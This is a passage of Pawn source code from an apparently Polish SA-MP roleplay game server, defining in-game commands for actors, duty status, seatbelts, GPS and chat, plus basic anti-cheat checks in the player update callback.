}

stock GetActorUID(actorid)
{
	for(new i; i<LastaUID; i++)
	{
		if(ActorCache[i][aID] == actorid)
		{
			return ActorCache[i][aUID];
		}
	}
	return 0;
}

CMD:aktorusun (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new actorid = GetPlayerCameraTargetDynActor(playerid);
	if(actorid == 0)
	return SendClientMessage(playerid, COLOR_GRAY, "NajedŸ kamer¹ na aktora, którego chcesz usun¹æ.");
	new actoruid = GetActorUID(actorid);
	RemoveActor(actoruid);
	Streamer_Update(playerid);
	return SendClientMessage(playerid, COLOR_GRAY, "Aktor zosta³ usuniêty z gry.");
}

CMD:aktoranim (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	new actorid = GetPlayerCameraTargetDynActor(playerid);
	if(actorid == 0)
	return SendClientMessage(playerid, COLOR_GRAY, "Twoja kamera musi byæ skierowana na aktora do edycji.");
	new anim[32], animlib[32], repeat;
	if(sscanf(params, "s[32]s[32]i", animlib, anim, repeat))
	return SendClientMessage(playerid, COLOR_GRAY, "/aanim [Biblioteka animacji] [Nazwa animacji] [ Potwarzaæ? 1 - tak, 0 - nie ]");
	new actoruid = GetActorUID(actorid);
	if(repeat)
	ApplyDynamicActorAnimation(ActorCache[actoruid][aID], animlib, anim, 4.1, 1, 0, 0, 0, 0);
	else
	ApplyDynamicActorAnimation(ActorCache[actoruid][aID], animlib, anim, 4.1, 0, 0, 0, 1, 0);
	ActorCache[actoruid][aAnimLib] = animlib;
	ActorCache[actoruid][aRepeat] = repeat;
	ActorCache[actoruid][aAnimName] = anim;
	return SendClientMessage(playerid, COLOR_GRAY, "Animacja aktora zosta³a ustawiona.");
}


CMD:duty (playerid, params[])
{
	new slot;
	if(sscanf(params, "i", slot))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /duty [slot], by wejœæ na s³u¿bê danej grupy.");
	if(pDuty[playerid])
	{
		new str[128];
		format(str, sizeof(str), "Schodzisz ze sluzby:~n~~y~%s", GroupCache[pDuty[playerid]][gName]);
		pDuty[playerid] = 0;
		UpdatePlayerInfo(playerid);
		UpdatePlayerName(playerid);
		if(pGPSTimer[playerid])
		{
			for(new i; i<=GetVehiclePoolSize(); i++)
			{
				DestroyDynamicMapIcon(VehicleMapIcon[i]);
			}
			KillTimer(pGPSTimer[playerid]);
			pGPSTimer[playerid] = 0;
		}
		return TextDrawForPlayerEx(playerid, 1, str, 3000);
	}
	new puid = PlayerCache[playerid][pUID];
/*	switch(slot)
	{
		case 1: 
		{
			if(PlayerCache[puid][pGroup] == 0)
			return SendClientMessage(playerid, COLOR_GRAY, "Pod wybranym slotem nie znajduje siê ¿adna grupa.");
			pDuty[playerid] = GroupCache[PlayerCache[puid][pGroup]][gUID];
		}
		case 2:
		{
			if(PlayerCache[puid][pGroup2] == 0)
			return SendClientMessage(playerid, COLOR_GRAY, "Pod wybranym slotem nie znajduje siê ¿adna grupa.");
			pDuty[playerid] = GroupCache[PlayerCache[puid][pGroup2]][gUID];
		}
		case 3:
		{
			if(PlayerCache[puid][pGroup3] == 0)
			return SendClientMessage(playerid, COLOR_GRAY, "Pod wybranym slotem nie znajduje siê ¿adna grupa.");
			pDuty[playerid] = GroupCache[PlayerCache[puid][pGroup3]][gUID];
		}
		default: return SendClientMessage(playerid, COLOR_GRAY, "Nieprawid³owy slot grupy.");
	}*/
	UpdatePlayerInfo(playerid);
	UpdatePlayerName(playerid);
	new str[128];
	format(str, sizeof(str), "Wchodzisz na sluzbe:~n~~y~%s", GroupCache[pDuty[playerid]][gName]);
	return TextDrawForPlayerEx(playerid, 1, str, 3000);
}

stock UpdatePlayerInfo(playerid)
{
	new str[128];
	if(pDuty[playerid] && pBelts[playerid])
	format(str, sizeof(str), "Sluzba: ~y~%s~w~, %s", GroupCache[pDuty[playerid]][gName], IsHelmet(playerid) ? ("kask") : ("pasy"));
	else if(pBelts[playerid])
	{
		if(IsHelmet(playerid))
		str = "kask";
		else
		str = "pasy";
	}
	else if(pDuty[playerid])
	format(str, sizeof(str), "Sluzba: ~y~%s", GroupCache[pDuty[playerid]][gName]);
	else
	str= " ";
	if(pDuty[playerid] && pGPSTimer[playerid])
	format(str, sizeof(str), "Sluzba: ~y~%s~w~, GPS", GroupCache[pDuty[playerid]][gName]);
	if(pDuty[playerid] && pBelts[playerid] && pGPSTimer[playerid])
	format(str, sizeof(str), "Sluzba: ~y~%s~w~, %s, GPS", GroupCache[pDuty[playerid]][gName], IsHelmet(playerid) ? ("kask") : ("pasy"));
	PlayerTextDrawSetString(playerid, DutyTxd[playerid], str);
	return PlayerTextDrawShow(playerid, DutyTxd[playerid]);
}

public OnVehicleDamageStatusUpdate(vehicleid, playerid)
{
	
	return 1;
}

CMD:pasy (playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid))
	return TextDrawForPlayerEx(playerid, 1, "Musisz znajdowac sie w pojezdzie.", 3000);
	if(IsVehicleSingleTrack(GetVehicleModel(GetPlayerVehicleID(playerid))))
	{
		if(pBelts[playerid])
		{
			pBelts[playerid] = false;
			UpdatePlayerName(playerid);
			UpdatePlayerInfo(playerid);
			SendPlayerMe(playerid, "zdejmuje kask z glowy.");
			RemovePlayerAttachedObject(playerid, 7);
			return TextDrawForPlayerEx(playerid, 1, "kask ~r~~h~zdjeto.", 3000);
		}
		pBelts[playerid] = true;
		UpdatePlayerName(playerid);
		UpdatePlayerInfo(playerid);
		SendPlayerMe(playerid, "zaklada kask na glowe.");
		SetPlayerAttachedObject(playerid, 7, 18978, 2, 0.065999,
		0.017000, 0.000000, 91.500000,97.200019,-0.899999, 1.0, 1.0, 1.0, 0, 0);
		return TextDrawForPlayerEx(playerid, 1, "kask ~g~~h~zalozono.", 3000);
	}
	if(pBelts[playerid])
	{
		pBelts[playerid] = false;
		UpdatePlayerName(playerid);
		UpdatePlayerInfo(playerid);
		SendPlayerMe(playerid, "odpina pasy.");
		return TextDrawForPlayerEx(playerid, 1, "pasy ~r~~h~odpiete.", 3000);
	}
	pBelts[playerid] = true;
	UpdatePlayerName(playerid);
	UpdatePlayerInfo(playerid);
	SendPlayerMe(playerid, "zapina pasy.");
	return TextDrawForPlayerEx(playerid, 1, "pasy ~g~~h~zapiete.", 3000);
}



public OnPlayerUpdate(playerid)
{
	if(PlayerCache[playerid][pLastUpdateTime] == 0){
		PlayerCache[playerid][pLastUpdateTime] = gettime();
	}
	new timeNow = gettime();
	// if a second passed we can check player stuff again, which is great because OnPlayerUpdate is called every 500ms OR if something is triggering
	// any other callback on the server + a timer loop will be useless every 1 second, because player is afk and we don't need to
	// check for  him so this update callback is great + anti cheat MUST be there otherwise there will be false-positives
	if(timeNow - PlayerCache[playerid][pLastUpdateTime] < 1){
		return 1;
	}
	PlayerCache[playerid][pLastUpdateTime] = gettime();
	if(PlayerCache[playerid][pUID] == 0){
		// if player is not logged and doing this stuff this is 100% true that he is cheating without ANY exceptions.
		if(GetPlayerWeapon(playerid))
			Ban(playerid);
		if(GetPlayerSpecialAction(playerid))
			Ban(playerid);
		return 1;
	}
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK)
	{
			KickPlayer(playerid, "System", "Jetpack spawn");
	}
	if(GetPlayerWeapon(playerid) != WeaponCache[playerid][wcVal] && GetPlayerWeapon(playerid) != 0 && !pShowingWeapon[playerid])
	{
			new str[64];
			format(str, sizeof(str), "Weapon Cheat (B) weaponid: %d", GetPlayerWeapon(playerid));
			if(GetPlayerWeapon(playerid) == 46 && !pWasInCar[playerid])
			{
				KickPlayer(playerid, "System", str);
			}
			else
			{
				KickPlayer(playerid, "System", str);
			}
	}
	if(PlayerCache[playerid][pBW_Time] && !pTeleport[playerid] && !PlayerCache[playerid][pAJ_Time])
	{
			if(!IsPlayerInRangeOfPoint(playerid, 5.0, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]))
			{
				//if(!PlayerCache[playerid][pAJ_Time])
				//AJPlayer(playerid, "System", "BW Bypass", 5);
			}
	}
	if(PlayerCache[playerid][pUID])
	{			
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(PlayerCache[playerid][pCurrentVehicle][vID], engine, lights, alarm, doors, bonnet, boot, objective);

			if(engine)
			{
				if(GetVehicleModel(playerid) == 481 || GetVehicleModel(playerid) == 509 || GetVehicleModel(playerid) == 510)
					{
						
					}
				else{
					new Float:speed = GetVehicleSpeed(PlayerCache[playerid][pCurrentVehicle][vID]);
					new Float:x, Float:y, Float:z;

					GetVehiclePos(PlayerCache[playerid][pCurrentVehicle][vID], x, y, z);
					//PlayerCache[playerid][pCurrentVehicle][vMileAge] += GetDistanceBetweenPoints(playerPosX, playerPosY, playerPosZ,  x, y, z);

					new str[128];
					format(str, sizeof(str),  "~y~~h~Licznik: ~w~%d km/h~n~~y~~h~Paliwo: ~w~%d/100l", floatround(speed), PlayerCache[playerid][pCurrentVehicle][vFuel]);
					PlayerTextDrawSetString(playerid, VehicleInfo[playerid], str);
					PlayerTextDrawShow(playerid, VehicleInfo[playerid]);
				}
			}
			else if(GetPlayerVehicleSeat(playerid) == -1)
			{
				if(GetPlayerGroundSpeed(playerid) > 9)
				{
					if(pWasInCar[playerid])
					{
						
					}
					else{
						if(GetPlayerSurfingVehicleID(playerid) != INVALID_VEHICLE_ID)
						{
							//GetPlayerPos(playerid, gX, gY, gZ);
							//SetPlayerPos(playerid, gX+3, gY, gZ-0.5);
							Freeze(playerid, 3000);
							GameTextForPlayer(playerid, "~r~~h~nie mozesz jezdzic na tym pojezdzie", 3000, 4);

						}
					}	
					
				//	AJPlayer(playerid, "System", "Rapid movement (A)", 30);
				}
			}
	}
	if(GetPlayerVehicleSeat(playerid) == 0)
	{
			new panels, doors, lights, tires;
			GetVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, tires);
			if(tires){
				SetVehicleVelocity(GetPlayerVehicleID(playerid), 2.0, 2.0, 2.0);
			}
	}
	if(GetPlayerDrunkLevel(playerid)){
			new Float:x, Float:y, Float:z;
			GetPlayerVelocity(playerid, x, y, z);
			if(x>=0.2 || y>=0.2){
				Freeze(playerid, 3000);
				TextDrawForPlayerEx(playerid, 2, "Twoja postac jest oslabiona.", 3000);
				ApplyAnimation(playerid, "ped", "IDLE_tired", 8.1, false, true, true, 1, 1);
			}
		
	}
	if(PlayerCache[playerid][pUID])
	{
		if(pAFK[playerid])
		{
			pAFK[playerid] = false;
			PlayerTextDrawHide(playerid, BWTextDraw[playerid]);
			UpdatePlayerName(playerid);
		}
		CallLocalFunction("OnPlayerWeaponChange", "ii", playerid, GetPlayerWeapon(playerid));
	}
	
	return 1;
}

stock IsPlayerInRangeOfPointEx(playerid, Float:distance, Float:tX, Float:tY)
{
	new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
	if(IsPlayerInRangeOfPoint(playerid, distance, tX, tY, Z))
	return 1;
	return 0;
}

CMD:id (playerid, params[])
{
	new name[128];
	if(sscanf(params, "s[128]", name))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /id [Nazwa/Czêœæ nazwy gracza].");
	new info[128], list[256] = "ID\tNick\t\n", count;
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID])
			{
				if(strfind(ReturnPlayerName(i), name, true) != -1)
				{
					format(info, sizeof(info), "%d\t%s%s\t\n", i, PlayerCache[i][pLevel] ? (GetHexRankColor(PlayerCache[i][pLevel])) : "", ReturnPlayerName(i));
					strins(list, info, strlen(list));
					count++;
				}
			}
		}
	}
	if(!count)
	return ShowDialogInfo(playerid, "Brak pasuj¹cych wyników.");
	return ShowPlayerDialog(playerid, D_INFO, DIALOG_STYLE_TABLIST_HEADERS, "Pasuj¹ce wyniki:", list, "ok", "");
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == 0)
		{
			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				if(ItemCache[i][iType] == 12)
				{
					if(ItemCache[i][iActive])
					{
						if(ItemCache[i][iVal2] == index)
						{
							if(response)
							{
								ItemCache[i][iAttachX] = fOffsetX;
								ItemCache[i][iAttachY] = fOffsetY;
								ItemCache[i][iAttachZ] = fOffsetZ;
								ItemCache[i][iAttachrX] = fRotX;
								ItemCache[i][iAttachrY] = fRotY;
								ItemCache[i][iAttachrZ] = fRotZ;
								ItemCache[i][iSizeX] = fScaleX;
								ItemCache[i][iSizeY] = fScaleY;
								ItemCache[i][iSizeZ] = fScaleZ;
								SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ,fRotX, fRotY,fRotZ, fScaleX ,fScaleY,fScaleZ, 0, 0);
								return ShowDialogInfo(playerid, "Przedmiot doczepiany zosta³ ustawiony pomyœlnie.");
							}
							else
							{
								if(ItemCache[i][iVal4])
								{
									new msg[128];
									format(msg, sizeof(msg), "zdejmuje %s.", ItemCache[i][iName]);
									SendPlayerMe(playerid, msg);
									SetPlayerName(playerid, PlayerCache[playerid][pName]);
									UpdatePlayerName(playerid);
									SetPlayerScore(playerid, PlayerCache[playerid][pScore]);				
								}			
								ItemCache[i][iActive] = 0;
								RemovePlayerAttachedObject(playerid, ItemCache[i][iVal2]);
								return ShowDialogInfo(playerid, "Edycja przedmiotu doczepianego zosta³a anulowana.\nZmiany nie zosta³y zapisane.");
							}
						}
					}
				}
			}
		}
	}
	return 1;
}

stock GetWeaponModel(weaponid)
{
	switch(weaponid)
	{
		case 1: return 331;
		case 2: return 333;
		case 3: return 334;
		case 4: return 335;
		case 5: return 336;
		case 6: return 337;
		case 7: return 338;
		case 8: return 339;
		case 9: return 341;
		case 10: return 321;
		case 11: return 322;
		case 12: return 323;
		case 13: return 324;
		case 14: return 325;
		case 15: return 326;
		case 16: return 342;
		case 17: return 343;
		case 18: return 344;
		case 22: return 346;
		case 23: return 347;
		case 24: return 348;
		case 25: return 349;
		case 26: return 350;
		case 27: return 351;
		case 28: return 352;
		case 29: return 353;
		case 30: return 355;
		case 31: return 356;
		case 32: return 372;
		case 33: return 357;
		case 34: return 358;
		case 35: return 359;
		case 36: return 360;
		case 37: return 361;
		case 38: return 362;
		case 39: return 363;
		case 40: return 364;
		case 41: return 365;
		case 42: return 366;
		case 43: return 367;
		case 46: return 371;
	}
	return 0;
}

CMD:toggleac (playerid, params[])
{
	if(PlayerCache[playerid][pLevel] < ADMINISTRATION)
	return 1;
	if(ac[playerid])
	{
		ac[playerid] = false;
		TextDrawForPlayerEx(playerid, 1, "~r~~h~Przelaczono automatyczny czat.", 3000);
	}
	else
	{
		ac[playerid] = true;
		TextDrawForPlayerEx(playerid, 1, "~g~~h~Przelaczono automatyczny czat.", 3000);
	}
	return 1;
}

stock IsVehicleSingleTrack(vehiclemodel)
{
	switch(vehiclemodel)
	{
		case 448: return 1;
		case 461: return 1;
		case 462: return 1;
		case 463: return 1;
		case 468: return 1;
		case 471: return 1;
		case 481: return 1;
		case 509: return 1;
		case 510: return 1;
		case 521: return 1;
		case 522: return 1;
		case 523: return 1;
		case 581: return 1;
		case 586: return 1;
	}
	return 0;
}

CMD:kask (playerid, params[])
{
	if(!IsVehicleSingleTrack(GetVehicleModel(GetPlayerVehicleID(playerid))))
	return TextDrawForPlayerEx(playerid, 1, "Nie mozesz uzyc kasku w tym pojezdzie.", 3000);
	return callcmd::pasy (playerid, params);
}

stock IsHelmet(playerid)
{
	if(IsVehicleSingleTrack(GetVehicleModel(GetPlayerVehicleID(playerid))))
	return 1;
	return 0;
}

CMD:sprobuj (playerid, params[])
{
	new action[128];
	if(sscanf(params, "s[128]", action))
	return SendClientMessage(playerid, COLOR_GRAY, "Poprawne u¿ycie: /sprobuj [sprobuj czynnosci postaci]");
	new msg[256];
	new success = random(2);
	if(PlayerCache[playerid][pGender])
	{
		if(success)
		format(msg, sizeof(msg), "* %s odnios³a sukces próbuj¹c %s. *", RPName(playerid), action);
		else
		format(msg, sizeof(msg), "* %s zawiod³a próbuj¹c %s. *", RPName(playerid), action);
	}
	else
	{
		if(success)
		format(msg, sizeof(msg), "* %s odniós³ sukces próbuj¹c %s. *", RPName(playerid), action);
		else
		format(msg, sizeof(msg), "* %s zawiód³ próbuj¹c %s. *", RPName(playerid), action);
	}
	return SendPlayerMessageInRange(playerid, msg, ME_SHADE_1, ME_SHADE_2, ME_SHADE_3, ME_SHADE_4, ME_SHADE_5, ME_SHADE_6, false);
}

CMD:mowner (playerid, params[])
{
/*	if(!ObjectCache[playerid][oUID])
	return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz teraz ¿adnego obiektu.");

	new ownertype;

	if(sscanf(params, "i", ownertype))
	return SendClientMessage(playerid, COLOR_GRAY, "Tip; /mowner [0-nikt, 1-tylko ja, 2-grupa]");

	if(ownertype < 0 || ownertype > 2)
	return SendClientMessage(playerid, COLOR_GRAY, "Owner bramy musi znajdowaæ siê w przedziale 0-2.");

	if(!ObjectCache[playerid][oGate])
	return SendClientMessage(playerid, COLOR_GRAY, "Ten obiekt nie jest bram¹.");

	new query[128];
	format(query, sizeof(query), "UPDATE objects SET ownerType = '%d' WHERE uid = '%d' LIMIT 1", ownertype, ObjectCache[playerid][oUID]);
	mysql_query(DB_HANDLE, query);

	if(ownertype == 0)
	{
		format(query, sizeof(query), "UPDATE objects SET owner = '%d' WHERE uid = '%d' LIMIT 1", 0, ObjectCache[playerid][oUID]);
		mysql_query(DB_HANDLE, query);
		return SendClientMessage(playerid, COLOR_GRAY, "Od teraz ka¿dy mo¿e poruszaæ t¹ bram¹.");
	}
	if(ownertype == 1)
	{
		format(query, sizeof(query), "UPDATE objects SET owner = '%d' WHERE uid = '%d' LIMIT 1", PlayerCache[playerid][pUID], ObjectCache[playerid][oUID]);
		mysql_query(DB_HANDLE, query);
		return SendClientMessage(playerid, COLOR_GRAY, "Teraz tylko Ty masz dostêp do bramy.");
	}
	if(ownertype == 2)
	{
		new list[256], info[64];
		if(PlayerCache[playerid][pGroup])
		{
			format(info, sizeof(info), "%d %s\n", GroupCache[PlayerCache[playerid][pGroup]][gUID], GroupCache[PlayerCache[playerid][pGroup]][gName]);
			strins(list, info, strlen(list));
		}
		if(PlayerCache[playerid][pGroup2])
		{
			format(info, sizeof(info), "%d %s\n", GroupCache[PlayerCache[playerid][pGroup2]][gUID], GroupCache[PlayerCache[playerid][pGroup2]][gName]);
			strins(list, info, strlen(list));
		}
		if(PlayerCache[playerid][pGroup3])
		{
			format(info, sizeof(info), "%d %s\n", GroupCache[PlayerCache[playerid][pGroup3]][gUID], GroupCache[PlayerCache[playerid][pGroup3]][gName]);
			strins(list, info, strlen(list));
		}
		if(Isnull(list))
		return ShowDialogInfo(playerid, "Nie znaleziono ¿adnych grup.");
		return ShowPlayerDialog(playerid, D_OBJECTGROUP, DIALOG_STYLE_LIST, "Dostêpne grupy", list, "Wybierz", "Anuluj");
	}*/
	return 1;
}

stock DestroyGroup(groupuid)
{
	/*new query[256];

	for(new i; i<LastdUID; i++)
	{
		if(DoorCache[i][dGroupUID] == groupuid)
		{
			DoorCache[i][dGroupUID] = 0;
			format(query, sizeof(query), "UPDATE doors SET groupUID = '0' WHERE UID = '%d'", i);
			mysql_query(DB_HANDLE, query);
		}
	}

	new str[128];
	format(str, sizeof(str), "Grupa %s zosta³a usuniêta.", GroupCache[groupuid][gName]);

	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pGroup] == groupuid)
			{
				PlayerCache[i][pGroup] = 0;
				SendClientMessage(i, COLOR_GRAY, str);
				query = "UPDATE players SET pgroup = '0'";
				mysql_query(DB_HANDLE, query);
			}
			else if(PlayerCache[i][pGroup2] == groupuid)
			{
				PlayerCache[i][pGroup] = 0;
				SendClientMessage(i, COLOR_GRAY, str);
				query = "UPDATE players SET pgroup2 = '0'";
				mysql_query(DB_HANDLE, query);
			}
			else if(PlayerCache[i][pGroup3] == groupuid)
			{
				PlayerCache[i][pGroup] = 0;
				SendClientMessage(i, COLOR_GRAY, str);
				query = "UPDATE players SET pgroup3 = '0'";
				mysql_query(DB_HANDLE, query);
			}
		}
	}

	GroupCache[groupuid][gState] = 1;
	format(query, sizeof(query), "DELETE FROM groups WHERE groups.uid = '%d' LIMIT 1", groupuid);
	mysql_query(DB_HANDLE, query);

	return 1;*/
}

stock SendMessageToAdmins(const message[])
{
	for(new i; i<=GetPlayerPoolSize();i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pLevel] >= ADMINISTRATION)
			{
				SendClientMessage(i, COL_AC_CHAT, message);
			}
		}
	}
	return 1;
}

stock GetGroupType(type)
{
	new string[32];
	switch(type)
	{
		case 0: string = "Party";
		case 1: string = "LSPD";
		case 2: string = "LSMC";
		case 3: string = "Grastronomia";
		case 4: string = "Org. Przestêpcza";
		case 5: string = "Org. Zmotoryzowana";
		case 6: string = "San News";
		case 7: string = "Ca³odobowy";
		case 8: string = "Bank";
		case 9: string = "Urz¹d";
		case 10: string ="Warsztat";
		case 11: string ="Meblowy";
		case 12: string ="Odzie¿owy";
		case 13: string ="Hotel";
		case 14: string ="Salon samochodowy";
		case 15: string ="Si³ownia";
		case 16: string ="FBI";
		default: string ="Nieznany";
	}
	return string;
}

CMD:wezanim (playerid, params[])
{
	new animlib[32], animname[32];
	if(sscanf(params, "s[32]s[32]", animlib, animname))
	return SendClientMessage(playerid, COLOR_GRAY, "animname animlib");
	return ApplyAnimation(playerid, animlib, animname,4.1, 0, 0, 0, 0, 0);
}

CMD:gps (playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid))
	return SendClientMessage(playerid, COLOR_GRAY, "Musisz znajdowaæ siê w pojeŸdzie by u¿yæ tej funkcji.");
	if(GetPlayerVehicleSeat(playerid) != 0)
	return SendClientMessage(playerid, COLOR_GRAY, "Musisz znajdowaæ siê na miejscu kierowcy by móc u¿yæ tej funkcji.");
	new guid = pDuty[playerid];
	if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
	{
		if(pGPSTimer[playerid])
		{
			KillTimer(pGPSTimer[playerid]);
			pGPSTimer[playerid] = 0;
			UpdatePlayerInfo(playerid);
			return SendPlayerMe(playerid, "dezaktywuje namierzanie GPS.");
		}
		pGPSTimer[playerid] = SetTimerEx("GPSTimer", 3000, true, "ii", playerid, guid);
		UpdatePlayerInfo(playerid);
		return SendPlayerMe(playerid, "aktywuje namierzanie GPS.");
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê na s³u¿bie odpowidniej grupy by móc u¿yæ tej funkcji.");
}

forward GPSTimer(playerid, guid);
public GPSTimer(playerid, guid)
{
	/*for(new i; i<=GetVehiclePoolSize(); i++)
	{
		DestroyDynamicMapIcon(VehicleMapIcon[i]);
	}
	new Float:X, Float:Y, Float:Z;
	new vuid;
	for(new k; k<=GetPlayerPoolSize(); k++)
	{
		if(IsPlayerConnected(k))
		{
			if(pGPSTimer[k])
			{
				vuid = GetVehicleUID(GetPlayerVehicleID(k));
				if( PlayerCache[playerid][pCurrentVehicle][vState] == 2)
				{
					if( PlayerCache[playerid][pCurrentVehicle][vOwner] == guid)
					{
						GetVehiclePos(GetPlayerVehicleID(k), X, Y, Z);
						VehicleMapIcon[GetPlayerVehicleID(k)] = CreateDynamicMapIcon(X, Y,Z, 30, -1, GetVehicleVirtualWorld(GetPlayerVehicleID(k)), 0, playerid, 60000, MAPICON_GLOBAL);
					}
				}
			}
		}
	}*/
}

/*CMD:sms (playerid, params[])
{
	return SendSMSToPlayer(playerid, params);
}*/

/*stock SendSMSToPlayer(playerid, sms[])
{
	for(new i; i<MAX_ITEMS; i++)
	{
		if(ItemCache[i][iState] == 0)
		{
			if(ItemCache[i][iType] == 2)
			{
				if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
				{
					if(ItemCache[i][iActive])
					{
						new num, text[128];
						if(sscanf(sms, "is[128]", num, text))
						return SendClientMessage(playerid, COLOR_GRAY, "Tip: /sms [numer] [treœæ]");
						if(num <= 50000)
						return SendClientMessage(playerid, COLOR_GRAY, "Wybrany numer jest nieprawid³owy.");
						for(new j=1; j<MAX_ITEMS; j++)
						{
							if(ItemCache[j][iType] == 2)
							{
								if(ItemCache[j][iVal]+50000 == num)
								{
									if(!ItemCache[j][iActive])
									{
										return SendClientMessage(playerid, COLOR_GRAY, "Osoba do której dzwonisz ma wy³¹czony telefon.");
									}
									for(new k; k<=GetPlayerPoolSize(); k++)
									{
										if(IsPlayerConnected(k))
										{
											if(pUID[k] == ItemCache[j][iOwner])
											{
												new msg[256];
												format(msg, sizeof(msg), "Wiadomoœæ SMS od numeru %d: {ffffff}%s", ItemCache[i][iVal]+50000, text);
												SendClientMessage(k, COLOR_GREEN, msg);
												if(PlayerCache[pUID[k]][pGender])
												format(msg, sizeof(msg), "* %s otrzyma³a wiadomoœæ SMS *", RPName(playerid));
												else
												format(msg, sizeof(msg), "* %s otrzyma³ wiadomoœæ SMS *", RPName(playerid));
												return Do(playerid, msg);
											}
										}
									}
									return SendClientMessage(playerid, COLOR_GRAY, "Abonament jest nieosi¹galny.");
								}
							}
						}
						return SendClientMessage(playerid, COLOR_GRAY, "Wybrany numer nie istnieje.");
					}
				}
			}
		}
	}
	return SendClientMessage(playerid, COLOR_GRAY, "Nie posiadasz telefonu lub jest on wy³¹czony.");
}*/

CMD:d (playerid, params[])
{
	/*if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType]  == 2 ||  GroupCache[pDuty[playerid]][gType]  == 16)
	{
		new text[128];
		if(sscanf(params, "s[128]", text))
		return SendClientMessage(playerid, COLOR_GRAY, "Tip: /d [treœæ]");
		new msg[256]; format(msg, sizeof(msg), "** (%s) %s: %s **", GroupCache[pDuty[playerid]][gName], RPName(playerid), text);
		new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
		new vw = GetPlayerVirtualWorld(playerid);
		new msg2[256]; format(msg2, sizeof(msg2), "%s (radio): %s", RPName(playerid), text);
		for(new i; i<=GetPlayerPoolSize(); i++)
		{
			if(IsPlayerConnected(i))
			{
				if(GroupCache[PlayerCache[i][pGroup]][gType] == 1 || GroupCache[PlayerCache[i][pGroup]][gType] == 2 ||
				GroupCache[PlayerCache[i][pGroup2]][gType] == 1 || GroupCache[PlayerCache[i][pGroup2]][gType] == 2
				|| GroupCache[PlayerCache[i][pGroup3]][gType] == 1 || GroupCache[PlayerCache[i][pGroup3]][gType] == 2 ||
				GroupCache[PlayerCache[i][pGroup2]][gType] == 16 ||  GroupCache[PlayerCache[i][pGroup3]][gType] == 16 || GroupCache[PlayerCache[i][pGroup3]][gType] == 16)
				{
					SendClientMessage(i, COLOR_GREEN, msg);
				}
				else
				{
					if(GetPlayerVirtualWorld(i) == vw)
					{
						if(IsPlayerInRangeOfPoint(i, 1, X, Y, Z))
						{
							if(PlayerCache[i][pBW_Time] > 0)
							{
								SendClientMessage(i, ME_SHADE_1, "Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
								continue;
							}
							SendFormattedMessage(i, msg2, "{B992C3}", "{EEEEEE}", CHAT_SHADE_1);
						}
						else if(IsPlayerInRangeOfPoint(i, 2, X, Y, Z))
						{
							if(PlayerCache[i][pBW_Time] > 0)
							{
								SendClientMessage(i, ME_SHADE_2, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
								continue;
							}
							SendFormattedMessage(i, msg2, "{AC79A7}", "{C8C8C8}", CHAT_SHADE_2);
						}
						else if(IsPlayerInRangeOfPoint(i, 3, X, Y, Z))
						{
							if(PlayerCache[i][pBW_Time] > 0)
							{
								SendClientMessage(i, ME_SHADE_3, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
								continue;
							}
							SendFormattedMessage(i, msg2, "{AC7998}", "{B4B4B4}", CHAT_SHADE_3);
						}
						else if(IsPlayerInRangeOfPoint(i, 6, X, Y, Z))
						{
							if(PlayerCache[i][pBW_Time] > 0)
							{
								SendClientMessage(i, ME_SHADE_4, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
								continue;
							}
							SendFormattedMessage(i, msg, "{AC6798}", "{8C8C8C}", CHAT_SHADE_4);
						}
						else if(IsPlayerInRangeOfPoint(i,12, X, Y, Z))
						{
							if(PlayerCache[i][pBW_Time] > 0)
							{
								SendClientMessage(i, ME_SHADE_5, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
								continue;
							}
							SendFormattedMessage(i, msg2, "{976798}", "{787878}", CHAT_SHADE_5);
						}
						else if(IsPlayerInRangeOfPoint(i, 18, X, Y, Z))
						{
							if(PlayerCache[i][pBW_Time] > 0)
							{
								SendClientMessage(i, ME_SHADE_6, "* Twoja postaæ jest nieprzytomna, wiêc nie mo¿e s³yszeæ wypowiedzi innych osób.");
								continue;
							}
							SendFormattedMessage(i, msg2, "{936583}", "{505050}", CHAT_SHADE_6);
						}
					}
				}
			}
		}
		return 1;
	}*/
	return SendClientMessage(playerid, COLOR_GRAY, "Musisz byæ na s³u¿bie odpowiedniej grupy by u¿yæ tej komendy.");
}

